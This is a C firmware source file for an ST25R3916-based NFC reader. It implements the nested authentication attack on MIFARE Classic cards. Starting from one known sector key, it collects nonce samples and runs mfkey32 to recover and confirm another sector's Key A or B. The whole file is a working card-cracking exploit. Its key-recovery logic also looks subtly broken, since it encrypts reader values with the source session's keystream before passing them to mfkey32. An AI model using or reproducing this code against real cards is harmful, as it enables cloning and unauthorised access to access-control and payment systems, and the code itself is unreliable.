/**
 * @file mf_nested.c
 * @brief Nested Authentication Attack for MIFARE Classic.
 *
 * Requires at least one known sector key. Collects multiple (nt, nr_enc, ar_enc)
 * triples via nested auth probes (AUTH sent inside an active Crypto1 session),
 * then uses mfkey32 to recover the target sector key offline.
 *
 * Protocol reference: proxmark3 / Flipper Zero nested implementation.
 *
 * ---- Nested auth wire protocol recap ----
 *
 *  Reader                              Card
 *    -- AUTH(known_sector) ----------->
 *    <-- nt_plain (cleartext) ---------
 *    -- {nr, ar} encrypted ----------->
 *    <-- at encrypted -----------------    <-- session is now active
 *
 *  (inside the active Crypto1 session)
 *    -- AUTH(target_block) encrypted -->   <-- 1-byte cmd + 1-byte block, encrypted
 *    <-- nt_target encrypted ----------    <-- 4 bytes, encrypted with CURRENT stream
 *    -- {nr_chosen, ar_computed} enc -->
 *    (do NOT wait for card's at; card may or may not respond, we only need nt)
 *
 *  The nt_target received on the wire is XOR'd with the running Crypto1 keystream.
 *  We decrypt it with the snapshot of the cipher state taken after the first auth.
 *
 * ---- mfkey32 input convention ----
 *
 *  uid     : UID as big-endian uint32
 *  nt      : plaintext card nonce (decrypted)
 *  nr_enc  : reader nonce as literally transmitted on wire (after XOR with keystream)
 *  ar_enc  : reader response as literally transmitted on wire
 *
 *  Two (nt, nr_enc, ar_enc) triples with the SAME target key are sufficient.
 */

#include "mf_nested.h"
#include "mf_classic.h"
#include "crypto1.h"
#include "mfkey.h"
#include "iso14443a.h"
#include "poller.h"
#include "nfc_common.h"
#include "hb_nfc_spi.h"
#include "st25r3916_fifo.h"
#include "st25r3916_irq.h"
#include "st25r3916_reg.h"
#include "st25r3916_cmd.h"

#include "esp_log.h"
#include <string.h>

#define TAG "mf_nested"

/* --------------------------------------------------------------------------
 * Internal helpers
 * -------------------------------------------------------------------------- */

/* Replicate the NO_TX_PAR / NO_RX_PAR bits from mifare.c */
#define ISOA_NO_TX_PAR (1U << 7)
#define ISOA_NO_RX_PAR (1U << 6)

static inline void nested_bit_set(uint8_t* buf, size_t bitpos, uint8_t v)
{
    if (v) buf[bitpos >> 3] |=  (uint8_t)(1U << (bitpos & 7U));
    else   buf[bitpos >> 3] &= (uint8_t)~(1U << (bitpos & 7U));
}

static inline uint8_t nested_bit_get(const uint8_t* buf, size_t bitpos)
{
    return (uint8_t)((buf[bitpos >> 3] >> (bitpos & 7U)) & 1U);
}

/** First data block for a MIFARE Classic sector (works for 1K and 4K). */
static uint8_t sector_to_first_block(uint8_t sector)
{
    if (sector < 32) {
        return (uint8_t)(sector * 4U);
    }
    return (uint8_t)(128U + (sector - 32U) * 16U);
}

/** Pack 4 bytes (big-endian) into a uint32. */
static inline uint32_t be4_to_u32(const uint8_t b[4])
{
    return ((uint32_t)b[0] << 24) | ((uint32_t)b[1] << 16) |
           ((uint32_t)b[2] <<  8) |  (uint32_t)b[3];
}

/** Unpack uint32 to 4 bytes big-endian. */
static inline void u32_to_be4(uint32_t v, uint8_t b[4])
{
    b[0] = (uint8_t)(v >> 24);
    b[1] = (uint8_t)(v >> 16);
    b[2] = (uint8_t)(v >>  8);
    b[3] = (uint8_t)(v);
}

/* --------------------------------------------------------------------------
 * mf_nested_collect_sample
 *
 * Must be called immediately after a successful mf_classic_auth().
 * The Crypto1 cipher is active in the global s_crypto inside mifare.c.
 * We obtain a copy of that state through mf_classic_get_crypto_state().
 *
 * We then:
 *  1. Build the 2-byte nested AUTH command {key_type_byte, target_block}
 *     and encrypt it byte-by-byte through our copy of the Crypto1 state.
 *  2. Transmit the encrypted command (with manual parity, NO_TX_PAR mode).
 *  3. Receive 4 encrypted bytes (+ 4 parity bits) — the card's nested nt.
 *  4. Decrypt nt using the running Crypto1 state.
 *  5. Choose nr_chosen (caller-supplied), encrypt it, compute ar, encrypt it.
 *  6. Transmit {nr_enc, ar_enc} to complete the nested auth handshake so the
 *     card's PRNG advances (prevents lockout on some cards).
 *  7. Fill sample->nt, sample->nr_enc, sample->ar_enc.
 *
 * NOTE: mfkey32 wants the nr and ar values *as transmitted on the wire*
 *       (i.e., already XOR'd with keystream).  That is exactly what we record.
 * -------------------------------------------------------------------------- */
hb_nfc_err_t mf_nested_collect_sample(uint8_t             target_block,
                                        const uint8_t       uid[4],
                                        uint32_t            nr_chosen,
                                        mf_nested_sample_t* sample)
{
    if (!uid || !sample) return HB_NFC_ERR_PARAM;

    /* ------------------------------------------------------------------ */
    /* 1. Snapshot the live Crypto1 state from the ongoing session.        */
    /* ------------------------------------------------------------------ */
    crypto1_state_t st;
    mf_classic_get_crypto_state(&st);

    /* ------------------------------------------------------------------ */
    /* 2. Build + encrypt the nested AUTH command (2 bytes).               */
    /*    For Key A the command byte is 0x60, Key B is 0x61.               */
    /*    Since we only need the nonce we always probe with Key A first;   */
    /*    the caller can try both keys in mf_nested_attack().              */
    /*                                                                     */
    /*    Framing: each byte is followed by its parity bit (9 bits/byte),  */
    /*    packed LSB-first into a byte buffer, mirroring mifare.c.         */
    /* ------------------------------------------------------------------ */
    const uint8_t cmd_plain[2] = { (uint8_t)MF_KEY_A, target_block };

    /* 2 bytes * 9 bits = 18 bits -> 3 bytes in the TX buffer */
    const size_t tx_bits  = 2U * 9U;
    const size_t tx_bytes = (tx_bits + 7U) / 8U;  /* = 3 */

    uint8_t tx_buf[8] = { 0 };
    size_t  bitpos    = 0;

    for (int i = 0; i < 2; i++) {
        uint8_t plain  = cmd_plain[i];
        uint8_t ks     = crypto1_byte(&st, 0, 0);
        uint8_t enc    = plain ^ ks;

        for (int bit = 0; bit < 8; bit++) {
            nested_bit_set(tx_buf, bitpos++, (enc >> bit) & 1U);
        }

        uint8_t par_ks = crypto1_filter_output(&st);
        uint8_t par    = crypto1_odd_parity8(plain) ^ par_ks;
        nested_bit_set(tx_buf, bitpos++, par);
    }

    /* ------------------------------------------------------------------ */
    /* 3. Send encrypted AUTH command (no CRC, manual parity via NO_TX_PAR)*/
    /* ------------------------------------------------------------------ */
    uint8_t iso_reg = 0;
    hb_spi_reg_read(REG_ISO14443A, &iso_reg);
    hb_spi_reg_write(REG_ISO14443A,
                     (uint8_t)(iso_reg | ISOA_NO_TX_PAR | ISOA_NO_RX_PAR));

    st25r_fifo_clear();
    st25r_set_tx_bytes((uint16_t)(tx_bits / 8U), (uint8_t)(tx_bits % 8U));
    st25r_fifo_load(tx_buf, tx_bytes);
    hb_spi_direct_cmd(CMD_TX_WO_CRC);

    if (!st25r_irq_wait_txe()) {
        hb_spi_reg_write(REG_ISO14443A, iso_reg);
        ESP_LOGW(TAG, "nested: TX timeout sending AUTH cmd");
        return HB_NFC_ERR_TX_TIMEOUT;
    }

    /* ------------------------------------------------------------------ */
    /* 4. Receive encrypted nt from card: 4 bytes + 4 parity bits = 36 bits*/
    /*    -> 5 bytes in the RX buffer.                                     */
    /* ------------------------------------------------------------------ */
    const size_t rx_bits  = 4U * 9U;
    const size_t rx_bytes = (rx_bits + 7U) / 8U;  /* = 5 */

    uint16_t count = 0;
    (void)st25r_fifo_wait(rx_bytes, 20, &count);
    if (count < rx_bytes) {
        hb_spi_reg_write(REG_ISO14443A, iso_reg);
        ESP_LOGW(TAG, "nested: RX timeout waiting for nt (got %u need %u)",
                 (unsigned)count, (unsigned)rx_bytes);
        return HB_NFC_ERR_TIMEOUT;
    }

    uint8_t rx_buf[8] = { 0 };
    st25r_fifo_read(rx_buf, rx_bytes);

    /* ------------------------------------------------------------------ */
    /* 5. Decrypt nt: XOR each encrypted byte with keystream.             */
    /* ------------------------------------------------------------------ */
    uint8_t nt_bytes[4] = { 0 };
    bitpos = 0;
    for (int i = 0; i < 4; i++) {
        uint8_t enc_byte = 0;
        for (int bit = 0; bit < 8; bit++) {
            enc_byte |= (uint8_t)(nested_bit_get(rx_buf, bitpos++) << bit);
        }
        uint8_t ks    = crypto1_byte(&st, 0, 0);
        nt_bytes[i]   = enc_byte ^ ks;
        bitpos++;   /* skip parity bit */
    }

    uint32_t nt_plain = be4_to_u32(nt_bytes);
    ESP_LOGI(TAG, "nested: block %u  nt=0x%08" PRIX32, target_block, nt_plain);

    /* ------------------------------------------------------------------ */
    /* 6. Encrypt nr_chosen and compute + encrypt ar.                     */
    /*    We must send {nr_enc, ar_enc} to complete the handshake so the  */
    /*    card's PRNG advances (avoids lockout on cards that track state). */
    /*                                                                     */
    /*    For mfkey32 we need the values *as transmitted on the wire*,    */
    /*    so we record the encrypted versions.                             */
    /* ------------------------------------------------------------------ */

    /* --- Prime Crypto1 with nt_plain XOR uid (nested handshake phase) - */
    /* The card's inner Crypto1 for the nested session starts from nt.    */
    /* We mimic the same priming used in the normal auth path.            */
    uint32_t uid32 = be4_to_u32(uid);
    crypto1_word(&st, nt_plain ^ uid32, 0);

    /* --- Encrypt nr_chosen ------------------------------------------- */
    uint8_t nr_plain_bytes[4];
    uint8_t nr_enc_bytes[4];
    u32_to_be4(nr_chosen, nr_plain_bytes);

    /* 8 data bytes (nr + ar) * 9 bits = 72 bits -> 9 bytes */
    const size_t tx2_bits  = 8U * 9U;
    const size_t tx2_bytes = (tx2_bits + 7U) / 8U;  /* = 9 */
    uint8_t tx2_buf[12] = { 0 };
    size_t  bitpos2 = 0;

    /* encrypt nr (4 bytes) */
    for (int i = 0; i < 4; i++) {
        uint8_t plain  = nr_plain_bytes[i];
        uint8_t ks     = crypto1_byte(&st, plain, 0);   /* feed plaintext nr */
        nr_enc_bytes[i] = plain ^ ks;

        for (int bit = 0; bit < 8; bit++) {
            nested_bit_set(tx2_buf, bitpos2++, (nr_enc_bytes[i] >> bit) & 1U);
        }
        uint8_t par_ks = crypto1_filter_output(&st);
        uint8_t par    = crypto1_odd_parity8(plain) ^ par_ks;
        nested_bit_set(tx2_buf, bitpos2++, par);
    }

    /* compute ar = prng_successor(nt_plain, 64) */
    uint32_t ar_plain_word = crypto1_prng_successor(nt_plain, 64);
    uint8_t  ar_plain_bytes[4];
    uint8_t  ar_enc_bytes[4];
    u32_to_be4(ar_plain_word, ar_plain_bytes);

    /* encrypt ar (4 bytes, feeding 0 — free-running LFSR) */
    for (int i = 0; i < 4; i++) {
        uint8_t plain  = ar_plain_bytes[i];
        uint8_t ks     = crypto1_byte(&st, 0, 0);
        ar_enc_bytes[i] = plain ^ ks;

        for (int bit = 0; bit < 8; bit++) {
            nested_bit_set(tx2_buf, bitpos2++, (ar_enc_bytes[i] >> bit) & 1U);
        }
        uint8_t par_ks = crypto1_filter_output(&st);
        uint8_t par    = crypto1_odd_parity8(plain) ^ par_ks;
        nested_bit_set(tx2_buf, bitpos2++, par);
    }

    /* ------------------------------------------------------------------ */
    /* 7. Transmit {nr_enc, ar_enc} to close the nested handshake.        */
    /*    We do not wait for the card's at response — we only needed nt.  */
    /* ------------------------------------------------------------------ */
    st25r_fifo_clear();
    st25r_set_tx_bytes((uint16_t)(tx2_bits / 8U), (uint8_t)(tx2_bits % 8U));
    st25r_fifo_load(tx2_buf, tx2_bytes);
    hb_spi_direct_cmd(CMD_TX_WO_CRC);

    /* Wait for TX to finish; ignore RX response (at) */
    (void)st25r_irq_wait_txe();

    hb_spi_reg_write(REG_ISO14443A, iso_reg);

    /* ------------------------------------------------------------------ */
    /* 8. Record the sample.                                               */
    /*    nr_enc and ar_enc are the on-wire (encrypted) values as needed   */
    /*    by mfkey32.                                                      */
    /* ------------------------------------------------------------------ */
    sample->nt     = nt_plain;
    sample->nr_enc = be4_to_u32(nr_enc_bytes);
    sample->ar_enc = be4_to_u32(ar_enc_bytes);

    ESP_LOGI(TAG, "nested sample: nt=0x%08" PRIX32 " nr_enc=0x%08" PRIX32
             " ar_enc=0x%08" PRIX32,
             sample->nt, sample->nr_enc, sample->ar_enc);

    return HB_NFC_OK;
}

/* --------------------------------------------------------------------------
 * mf_nested_attack
 *
 * Full nested attack:
 *  1. Derive first blocks for source and target sectors.
 *  2. Collect MF_NESTED_SAMPLE_COUNT samples (each round: reselect, auth src,
 *     probe target).
 *  3. Try mfkey32 on consecutive sample pairs.
 *  4. For each candidate key64, try Key A then Key B by real auth.
 *  5. Return the verified key.
 * -------------------------------------------------------------------------- */
hb_nfc_err_t mf_nested_attack(nfc_iso14443a_data_t*   card,
                                uint8_t                  src_sector,
                                const mf_classic_key_t*  src_key,
                                mf_key_type_t            src_key_type,
                                uint8_t                  target_sector,
                                mf_classic_key_t*        found_key_out,
                                mf_key_type_t*           found_key_type_out)
{
    if (!card || !src_key || !found_key_out || !found_key_type_out)
        return HB_NFC_ERR_PARAM;

    uint8_t src_block    = sector_to_first_block(src_sector);
    uint8_t target_block = sector_to_first_block(target_sector);

    ESP_LOGI(TAG, "nested attack: src_sector=%u (block %u)  target_sector=%u (block %u)",
             src_sector, src_block, target_sector, target_block);

    /* ------------------------------------------------------------------ */
    /* Collect samples.                                                    */
    /* ------------------------------------------------------------------ */
    mf_nested_sample_t samples[MF_NESTED_SAMPLE_COUNT];
    int n_samples = 0;

    for (int attempt = 0; attempt < MF_NESTED_MAX_ATTEMPTS && n_samples < MF_NESTED_SAMPLE_COUNT; attempt++) {

        /* Reset auth state and reselect the card. */
        mf_classic_reset_auth();

        hb_nfc_err_t sel_err = iso14443a_poller_reselect(card);
        if (sel_err != HB_NFC_OK) {
            ESP_LOGW(TAG, "nested: reselect failed on attempt %d (%d)", attempt, sel_err);
            continue;
        }

        /* Authenticate to the known source sector. */
        hb_nfc_err_t auth_err = mf_classic_auth(src_block, src_key_type,
                                                  src_key, card->uid);
        if (auth_err != HB_NFC_OK) {
            ESP_LOGW(TAG, "nested: src auth failed on attempt %d (%d)", attempt, auth_err);
            continue;
        }

        /*
         * Choose a deterministic nr so that if we run the attack twice with
         * the same uid+key pair the mfkey32 inputs are reproducible.
         * Using a counter-based value as specified.
         */
        uint32_t nr_chosen = 0xDEAD0000U + (uint32_t)attempt;

        hb_nfc_err_t sample_err = mf_nested_collect_sample(target_block,
                                                             card->uid,
                                                             nr_chosen,
                                                             &samples[n_samples]);
        if (sample_err == HB_NFC_OK) {
            n_samples++;
            ESP_LOGI(TAG, "nested: collected sample %d/%d",
                     n_samples, MF_NESTED_SAMPLE_COUNT);
        } else {
            ESP_LOGW(TAG, "nested: collect_sample failed on attempt %d (%d)",
                     attempt, sample_err);
        }
    }

    if (n_samples < 2) {
        ESP_LOGE(TAG, "nested: not enough samples (got %d, need >= 2)", n_samples);
        return HB_NFC_ERR_AUTH;
    }

    ESP_LOGI(TAG, "nested: running mfkey32 on %d sample pairs", n_samples - 1);

    /* ------------------------------------------------------------------ */
    /* Run mfkey32 on consecutive pairs and verify each candidate.        */
    /* ------------------------------------------------------------------ */
    uint32_t uid32 = ((uint32_t)card->uid[0] << 24) |
                     ((uint32_t)card->uid[1] << 16) |
                     ((uint32_t)card->uid[2] <<  8) |
                      (uint32_t)card->uid[3];

    for (int i = 0; i < n_samples - 1; i++) {
        uint64_t key64 = 0;

        bool found = mfkey32(uid32,
                             samples[i].nt,     samples[i].nr_enc,     samples[i].ar_enc,
                             samples[i+1].nt,   samples[i+1].nr_enc,   samples[i+1].ar_enc,
                             &key64);
        if (!found) {
            ESP_LOGD(TAG, "nested: mfkey32 pair %d/%d: no candidate", i, i + 1);
            continue;
        }

        ESP_LOGI(TAG, "nested: mfkey32 pair %d/%d: candidate 0x%012" PRIX64,
                 i, i + 1, key64);

        /* Convert key64 to mf_classic_key_t (big-endian, 6 bytes). */
        mf_classic_key_t k;
        uint64_t tmp = key64;
        for (int b = 5; b >= 0; b--) {
            k.data[b] = (uint8_t)(tmp & 0xFFU);
            tmp >>= 8;
        }

        /* Verify by real authentication — try Key A, then Key B. */
        mf_classic_reset_auth();
        if (iso14443a_poller_reselect(card) != HB_NFC_OK) {
            ESP_LOGW(TAG, "nested: reselect failed during verification");
            continue;
        }

        if (mf_classic_auth(target_block, MF_KEY_A, &k, card->uid) == HB_NFC_OK) {
            ESP_LOGI(TAG, "nested: KEY A verified for sector %u", target_sector);
            *found_key_out      = k;
            *found_key_type_out = MF_KEY_A;
            return HB_NFC_OK;
        }

        mf_classic_reset_auth();
        if (iso14443a_poller_reselect(card) != HB_NFC_OK) {
            ESP_LOGW(TAG, "nested: reselect failed during Key B verification");
            continue;
        }

        if (mf_classic_auth(target_block, MF_KEY_B, &k, card->uid) == HB_NFC_OK) {
            ESP_LOGI(TAG, "nested: KEY B verified for sector %u", target_sector);
            *found_key_out      = k;
            *found_key_type_out = MF_KEY_B;
            return HB_NFC_OK;
        }

        ESP_LOGD(TAG, "nested: candidate key failed real auth for sector %u", target_sector);
    }

    ESP_LOGW(TAG, "nested: attack exhausted all pairs — no key found for sector %u",
             target_sector);
    return HB_NFC_ERR_AUTH;
}
